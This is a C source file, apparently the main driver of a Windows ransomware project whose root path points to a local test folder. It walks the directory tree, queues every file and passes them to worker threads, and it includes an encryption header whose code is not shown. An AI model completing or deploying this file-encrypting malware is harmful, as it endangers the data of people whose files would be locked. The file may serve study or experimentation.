#include <stdio.h>
#include <windows.h>
#include <assert.h>
#include <time.h>
#include "stack.h"
#include "file_utils.h"
#include "thread.h"
#include "encrypt.h"
#include "sync.h"

#define ROOT_PATH L"C:\\Users\\mouri\\Documents\\projects\\ransomware\\test\\"

void free_str(void *element) {
    free(element);
}

int main(void) {
    sync_create_semaphore();
    sync_create_mutex();

    struct Stack *files_stack = stack_init();
    struct Stack *folders_stack = stack_init();

    struct ThreadParams *thread_params;
    struct Threads *threads = thread_create(files_stack, &thread_params);

    wchar_t *folder_path;
    time_t start, end;

    start = time(NULL);
    do {
        if(stack_is_empty(folders_stack)) {
            if((folder_path = _wcsdup(ROOT_PATH)) == NULL) {
                return 1;
            }
        } else {
            folder_path = (wchar_t*)stack_pop(folders_stack);
        }

        fu_populate_stacks_from_directory(folder_path, folders_stack, files_stack);
        free(folder_path);
    } while(!stack_is_empty(folders_stack));
    end = time(NULL);
    
    printf("done (files: %zu)\n", files_stack->size);
    printf("Elapsed time : %llds\n", end - start);

    while(!stack_is_empty(files_stack)) {
        Sleep(10);
    }

    thread_terminate();
    thread_wait_all(threads);

    // free stacks
    stack_free(&folders_stack, free_str);
    stack_free(&files_stack, free_str);
    
    // clean up sync
    sync_cleanup_mutex();
    sync_cleanup_semaphore();
    
    // free threads and params
    thread_free(&threads);
    free(thread_params);
    return 0;
}